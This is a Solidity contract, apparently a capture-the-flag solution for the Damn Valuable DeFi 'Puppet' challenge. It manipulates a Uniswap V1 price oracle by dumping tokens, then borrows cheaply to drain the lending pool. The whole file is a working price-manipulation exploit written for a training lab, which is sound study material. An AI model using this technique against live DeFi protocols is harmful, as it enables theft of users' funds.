// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";

contract PuppetAttacker {
    IUniswapV1Exchange uniswapV1Exchange;
    PuppetPool puppetPool;
    DamnValuableToken token;
    address recovery;

    constructor(
        IUniswapV1Exchange _uniswapV1Exchange,
        PuppetPool _puppetPool,
        DamnValuableToken _token,
        address _recovery
    ) payable {
        uniswapV1Exchange = _uniswapV1Exchange;
        puppetPool = _puppetPool;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint256 amount) external {
        // approve tokens to transfer to uniV1Exchange
        uint256 balanceToken = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), balanceToken);

        // plummet DVT token price by transfering a large amount of tokens
        uniswapV1Exchange.tokenToEthTransferInput(balanceToken, 1, block.timestamp, address(this));

        // calculate how much ether is needed to drain the puppet pool
        uint256 depositReq = puppetPool.calculateDepositRequired(amount);

        // drain pool
        puppetPool.borrow{value: depositReq}(amount, recovery);
    }

    receive() external payable {}
}
